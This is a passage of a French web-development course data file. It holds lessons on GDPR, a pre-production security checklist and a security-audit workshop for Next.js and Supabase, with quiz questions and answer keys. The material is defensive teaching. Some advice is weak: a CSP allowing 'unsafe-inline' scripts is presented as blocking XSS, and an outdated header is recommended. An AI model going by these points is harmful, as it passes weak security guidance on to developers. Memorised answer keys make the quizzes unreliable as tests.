      { type: "mcq", question: "Qu'est-ce que le droit à l'effacement (droit à l'oubli) implique techniquement ?", options: JSON.stringify(["Masquer le profil utilisateur de la page publique", "Supprimer réellement toutes les données de l'utilisateur de la base de données", "Désactiver le compte pendant 30 jours", "Anonymiser le nom affiché"]), correctAnswer: "Supprimer réellement toutes les données de l'utilisateur de la base de données", explanation: "Le droit à l'effacement exige une suppression réelle des données, pas un simple soft delete. L'utilisateur doit pouvoir demander que toutes ses données personnelles soient supprimées de ta base." },
      { type: "true_false", question: "Un bandeau cookies avec un gros bouton 'Accepter' et un petit lien 'Refuser' en gris est conforme au RGPD.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "C'est un dark pattern interdit par le RGPD. Les boutons Accepter et Refuser doivent être aussi visibles l'un que l'autre. La CNIL sanctionne activement ce type de pratique." },
      { type: "mcq", question: "Parmi ces données, laquelle n'est PAS considérée comme une donnée personnelle au sens du RGPD ?", options: JSON.stringify(["Adresse email", "Adresse IP", "Version du navigateur utilisé", "Nom complet"]), correctAnswer: "Version du navigateur utilisé", explanation: "Le RGPD considère comme données personnelles toute information permettant d'identifier directement ou indirectement une personne : nom, email, adresse IP, cookies... La version du navigateur seule ne permet pas d'identifier quelqu'un." },
      { type: "true_false", question: "Le RGPD s'applique uniquement aux entreprises basées dans l'Union Européenne.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "Le RGPD s'applique dès que tu traites des données personnelles de résidents européens, peu importe où ton entreprise est basée. Même un développeur freelance en dehors de l'UE est concerné s'il a des utilisateurs européens." },
      { type: "mcq", question: "Tu lances une app SaaS qui collecte nom, email et historique d'utilisation. Quelle est la première chose à faire côté RGPD ?", options: JSON.stringify(["Demander un audit juridique complet à 5000€", "Créer un registre des traitements listant les données collectées, les finalités et les durées de conservation", "Attendre d'avoir 1000 utilisateurs avant de s'en occuper", "Ajouter juste une page mentions légales"]), correctAnswer: "Créer un registre des traitements listant les données collectées, les finalités et les durées de conservation", explanation: "Le registre des traitements est la première étape concrète : il te force à réfléchir à quelles données tu collectes, pourquoi, et pendant combien de temps. C'est la base de ta conformité RGPD." },
    ],
  },

  // ─── LEÇON 6 : Checklist sécurité avant production ───
  {
    order: 6,
    module: 14,
    title: "Checklist sécurité avant production",
    slug: "checklist-securite-production",
    duration: "15 min",
    description: "La checklist complète à vérifier avant chaque mise en production : headers HTTP, HTTPS, CSP, audit des dépendances et plus encore.",
    content: blocks([
      { id: "6-1", type: "heading", level: 2, text: "Avant de déployer : la checklist qui sauve" },
      { id: "6-2", type: "text", html: "<p>Tu as codé ton app, elle fonctionne, les tests passent. Tu es prêt à déployer ? <strong>Attends.</strong> Avant chaque mise en production, passe cette checklist de sécurité. C'est comme un pilote d'avion qui vérifie ses instruments avant de décoller — ça prend 15 minutes et ça peut sauver ton projet.</p>" },
      { id: "6-3", type: "separator", style: "dots" },

      { id: "6-4", type: "heading", level: 2, text: "Headers HTTP de sécurité" },
      { id: "6-5", type: "text", html: "<p>Les headers HTTP de sécurité sont des instructions envoyées au navigateur pour le protéger contre certaines attaques. Tu les configures dans <code>next.config.js</code> :</p><pre><code>// next.config.js\nconst securityHeaders = [\n  { key: 'X-Frame-Options', value: 'DENY' },\n  { key: 'X-Content-Type-Options', value: 'nosniff' },\n  { key: 'Referrer-Policy', value: 'origin-when-cross-origin' },\n  { key: 'X-XSS-Protection', value: '1; mode=block' },\n];</code></pre>" },
      { id: "6-6", type: "comparison", headers: ["Header", "Protection contre", "Valeur recommandée"], rows: [
        { cells: ["X-Frame-Options", "Clickjacking (iframe piégée)", "DENY"] },
        { cells: ["X-Content-Type-Options", "MIME type sniffing", "nosniff"] },
        { cells: ["Referrer-Policy", "Fuite d'URL dans le referrer", "origin-when-cross-origin"] },
        { cells: ["Strict-Transport-Security", "Downgrade HTTPS vers HTTP", "max-age=63072000"] },
      ]},
      { id: "6-7", type: "separator", style: "line" },

      { id: "6-8", type: "heading", level: 2, text: "Content Security Policy (CSP)" },
      { id: "6-9", type: "text", html: "<p>La CSP est le header de sécurité le plus puissant. Elle dit au navigateur : <em>\"N'exécute que du JavaScript provenant de ces sources autorisées.\"</em> Ça bloque les attaques XSS même si un attaquant arrive à injecter du HTML.</p><pre><code>Content-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'unsafe-inline';\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' data: https:;\n  connect-src 'self' https://*.supabase.co;</code></pre><p><strong>Attention :</strong> Une CSP trop restrictive peut casser ton app. Teste toujours en staging avant de déployer en prod.</p>" },

      { id: "6-10", type: "heading", level: 2, text: "Audit des dépendances" },
      { id: "6-11", type: "text", html: "<p>Tes dépendances npm peuvent contenir des vulnérabilités connues. Avant chaque déploiement, lance un audit :</p><pre><code># Audit des vulnérabilités\nnpm audit\n\n# Correction automatique\nnpm audit fix\n\n# Voir les détails\nnpm audit --json</code></pre><p>Pour un audit plus poussé, utilise <code>npx better-npm-audit audit</code> qui te donne des rapports plus lisibles et te permet de configurer des seuils de tolérance.</p>" },

      { id: "6-12", type: "heading", level: 2, text: "La checklist complète" },
      { id: "6-13", type: "checklist", title: "Sécurité pré-production", items: [
        { id: "c1", text: "RLS activé sur toutes les tables Supabase" },
        { id: "c2", text: "Aucun secret dans le code source ou les variables NEXT_PUBLIC_" },
        { id: "c3", text: "Headers de sécurité configurés (X-Frame-Options, CSP, etc.)" },
        { id: "c4", text: "HTTPS forcé partout (Vercel le fait automatiquement)" },
        { id: "c5", text: "npm audit sans vulnérabilité critique" },
        { id: "c6", text: "Validation Zod sur toutes les API Routes" },
        { id: "c7", text: "Rate limiting sur les routes sensibles" },
        { id: "c8", text: "Pages mentions légales et politique de confidentialité en place" },
        { id: "c9", text: "Bandeau cookies conforme RGPD" },
        { id: "c10", text: "Logs d'erreurs configurés (Sentry ou équivalent)" },
      ]},
      { id: "6-14", type: "callout", variant: "success", html: "<strong>Bonne pratique :</strong> Crée un fichier <code>SECURITY_CHECKLIST.md</code> à la racine de ton projet et coche chaque item avant chaque release. Automatise ce que tu peux avec des tests et des scripts CI/CD." },
    ]),
    exercise: "<p><strong>Exercice :</strong> (1) Ajoute les headers de sécurité dans ton <code>next.config.js</code>. (2) Lance <code>npm audit</code> et corrige les vulnérabilités critiques. (3) Vérifie tes headers avec <a href='https://securityheaders.com' target='_blank'>securityheaders.com</a> — vise un score A minimum. (4) Parcours la checklist complète et note ce qui te manque.</p>",
    quiz: [
      { type: "mcq", question: "Quel header HTTP protège contre le clickjacking (attaque par iframe) ?", options: JSON.stringify(["X-Content-Type-Options", "X-Frame-Options", "Referrer-Policy", "Content-Security-Policy"]), correctAnswer: "X-Frame-Options", explanation: "X-Frame-Options avec la valeur DENY empêche ton site d'être chargé dans une iframe, ce qui protège contre le clickjacking — une attaque où un site malveillant superpose une iframe invisible pour piéger les clics de l'utilisateur." },
      { type: "true_false", question: "La Content Security Policy (CSP) peut bloquer les attaques XSS même si un attaquant arrive à injecter du HTML.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "La CSP dit au navigateur de n'exécuter que du JavaScript provenant de sources autorisées. Même si un attaquant injecte un script malveillant, le navigateur refusera de l'exécuter s'il ne vient pas d'une source autorisée." },
      { type: "mcq", question: "Quelle commande permet d'auditer les vulnérabilités de tes dépendances npm ?", options: JSON.stringify(["npm check", "npm audit", "npm security", "npm vulnerabilities"]), correctAnswer: "npm audit", explanation: "npm audit analyse ton arbre de dépendances et identifie les packages contenant des vulnérabilités connues. npm audit fix tente de corriger automatiquement les vulnérabilités en mettant à jour les packages." },
      { type: "true_false", question: "Sur Vercel, HTTPS est activé automatiquement sans configuration supplémentaire.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "Vercel configure automatiquement HTTPS avec des certificats SSL gratuits pour tous les domaines. Tu n'as rien à faire — c'est un des avantages de la plateforme." },
      { type: "mcq", question: "Tu déploies ton app et le site securityheaders.com te donne un score F. Quelle est la cause la plus probable ?", options: JSON.stringify(["Ton app est trop lente", "Tu n'as configuré aucun header de sécurité dans next.config.js", "Ton certificat SSL est expiré", "Tu utilises trop de dépendances npm"]), correctAnswer: "Tu n'as configuré aucun header de sécurité dans next.config.js", explanation: "Un score F signifie qu'aucun header de sécurité n'est présent. Par défaut, Next.js n'ajoute pas ces headers — tu dois les configurer manuellement dans next.config.js. C'est rapide à faire et ça améliore drastiquement ta posture de sécurité." },
    ],
  },

  // ─── LEÇON 7 : Atelier : audit de sécurité d'un projet ───
  {
    order: 7,
    module: 14,
    title: "Atelier : audit de sécurité d'un projet",
    slug: "atelier-audit-securite-projet",
    duration: "25 min",
    description: "Mettre en pratique toutes les leçons : prendre un projet vulnérable et le sécuriser étape par étape avec une méthodologie d'audit professionnelle.",
    content: blocks([
      { id: "7-1", type: "heading", level: 2, text: "L'audit de sécurité : ta nouvelle compétence premium" },
      { id: "7-2", type: "text", html: "<p>Savoir auditer la sécurité d'un projet, c'est une compétence qui se vend cher. Un audit de sécurité, c'est entre <strong>500€ et 3000€</strong> selon la taille du projet. Et c'est souvent la première chose que les clients sérieux demandent avant de lancer en production.</p><p>Dans cet atelier, tu vas suivre une méthodologie d'audit en 5 étapes et l'appliquer sur un projet type.</p>" },
      { id: "7-3", type: "callout", variant: "info", html: "<strong>Objectif :</strong> À la fin de cet atelier, tu seras capable de réaliser un audit de sécurité basique sur n'importe quel projet Next.js + Supabase et de livrer un rapport d'audit professionnel." },
      { id: "7-4", type: "separator", style: "dots" },

      { id: "7-5", type: "heading", level: 2, text: "La méthodologie d'audit en 5 étapes" },
      { id: "7-6", type: "diagram", variant: "flow", nodes: [
        { id: "n1", label: "1. Reconnaissance", description: "Inventaire des endpoints, tables, APIs tierces" },
        { id: "n2", label: "2. Analyse des accès", description: "RLS, auth, permissions, clés API" },
        { id: "n3", label: "3. Test des entrées", description: "Validation, injection, XSS sur chaque formulaire" },
        { id: "n4", label: "4. Revue de config", description: "Headers, env vars, dépendances, HTTPS" },
        { id: "n5", label: "5. Rapport & remédiation", description: "Documenter les failles et les corrections" },
      ]},
      { id: "7-7", type: "separator", style: "line" },

      { id: "7-8", type: "heading", level: 2, text: "Étape 1 : Reconnaissance" },
      { id: "7-9", type: "text", html: "<p>Commence par cartographier le projet :</p><ul><li><strong>Endpoints API :</strong> Liste toutes les routes dans <code>/app/api/</code></li><li><strong>Tables Supabase :</strong> Note chaque table et ses colonnes sensibles</li><li><strong>APIs tierces :</strong> OpenAI, Stripe, SendGrid — quels accès ont-elles ?</li><li><strong>Formulaires :</strong> Identifie chaque point d'entrée de données utilisateur</li></ul>" },

      { id: "7-10", type: "heading", level: 2, text: "Étape 2 : Analyse des accès" },
      { id: "7-11", type: "checklist", title: "Points à vérifier", items: [
        { id: "c1", text: "RLS activé sur TOUTES les tables contenant des données utilisateurs" },
        { id: "c2", text: "Policies RLS pour SELECT, INSERT, UPDATE, DELETE sur chaque table" },
        { id: "c3", text: "Authentification vérifiée côté serveur dans chaque API Route protégée" },
        { id: "c4", text: "Clé service_role utilisée uniquement côté serveur" },
        { id: "c5", text: "Aucune donnée sensible exposée dans les réponses API" },
      ]},

      { id: "7-12", type: "heading", level: 2, text: "Le rapport d'audit" },
      { id: "7-13", type: "text", html: "<p>Un rapport d'audit professionnel contient :</p><ol><li><strong>Résumé exécutif :</strong> 3 lignes pour le client non technique</li><li><strong>Score de risque :</strong> Critique / Élevé / Moyen / Faible</li><li><strong>Failles détectées :</strong> Description, impact, preuve, sévérité</li><li><strong>Recommandations :</strong> Correction pour chaque faille, par ordre de priorité</li><li><strong>Checklist de conformité :</strong> Ce qui est OK et ce qui ne l'est pas</li></ol>" },
      { id: "7-14", type: "comparison", headers: ["Sévérité", "Description", "Exemple", "Délai de correction"], rows: [
        { cells: ["Critique", "Accès non autorisé aux données", "RLS désactivé sur table users", "Immédiat (< 24h)"] },
        { cells: ["Élevé", "Fuite de données possible", "Clé service_role dans NEXT_PUBLIC_", "< 48h"] },
        { cells: ["Moyen", "Protection manquante", "Pas de rate limiting sur /api/auth", "< 1 semaine"] },
        { cells: ["Faible", "Bonne pratique non respectée", "Headers de sécurité manquants", "< 1 mois"] },
      ]},
      { id: "7-15", type: "callout", variant: "tip", html: "<strong>Astuce business :</strong> Propose un audit de sécurité comme <strong>service additionnel</strong> à chaque projet que tu livres. C'est un excellent upsell : 500-1000€ de plus pour 2-3h de travail une fois que tu maîtrises la méthodologie." },
    ]),
    exercise: "<p><strong>Exercice :</strong> Réalise un audit de sécurité complet sur ton projet actuel (ou un projet précédent). (1) Suis les 5 étapes de la méthodologie. (2) Note chaque faille trouvée avec sa sévérité. (3) Corrige les failles critiques et élevées immédiatement. (4) Rédige un rapport d'audit d'une page avec le résumé exécutif, les failles et les recommandations. (5) Bonus : utilise ce rapport comme template pour tes futurs audits clients.</p>",
    quiz: [
      { type: "mcq", question: "Quelle est la première étape d'un audit de sécurité ?", options: JSON.stringify(["Corriger les failles trouvées", "Reconnaissance : cartographier les endpoints, tables et APIs", "Rédiger le rapport final", "Installer des outils de scan automatique"]), correctAnswer: "Reconnaissance : cartographier les endpoints, tables et APIs", explanation: "La reconnaissance est toujours la première étape. Avant de chercher des failles, tu dois savoir exactement ce que tu audites : quels endpoints, quelles tables, quelles APIs tierces, quels formulaires." },
      { type: "true_false", question: "Une faille de sévérité 'Critique' comme un RLS désactivé doit être corrigée en moins de 24 heures.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "Une faille critique comme un RLS désactivé signifie que les données de tous les utilisateurs sont accessibles à n'importe qui. C'est un accès non autorisé aux données — la correction doit être immédiate, en moins de 24 heures." },
      { type: "mcq", question: "Combien peut-on facturer un audit de sécurité basique sur un projet Next.js + Supabase ?", options: JSON.stringify(["50-100€", "500-3000€", "10 000-50 000€", "C'est toujours gratuit"]), correctAnswer: "500-3000€", explanation: "Un audit de sécurité basique se facture entre 500 et 3000€ selon la taille du projet. C'est une compétence premium qui peut être proposée comme service additionnel à chaque livraison de projet." },
      { type: "true_false", question: "Un rapport d'audit de sécurité doit inclure un résumé exécutif compréhensible par un client non technique.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "Le résumé exécutif en 3 lignes est essentiel pour que le client (souvent non technique) comprenne la situation. Le reste du rapport entre dans les détails techniques pour l'équipe de développement." },
      { type: "mcq", question: "Tu audites un projet client et tu trouves que la clé service_role Supabase est dans une variable NEXT_PUBLIC_. Quelle sévérité attribues-tu ?", options: JSON.stringify(["Faible — c'est juste une mauvaise pratique", "Moyen — ça pourrait poser problème", "Élevé — fuite de données possible car la clé admin est exposée côté client", "Ce n'est pas une faille de sécurité"]), correctAnswer: "Élevé — fuite de données possible car la clé admin est exposée côté client", explanation: "La clé service_role bypass toutes les règles RLS. Si elle est dans une variable NEXT_PUBLIC_, elle est visible dans le bundle JavaScript côté client. N'importe qui peut l'utiliser pour accéder, modifier ou supprimer toutes les données de la base. C'est une faille de sévérité élevée qui doit être corrigée en moins de 48h." },
    ],
  },
];
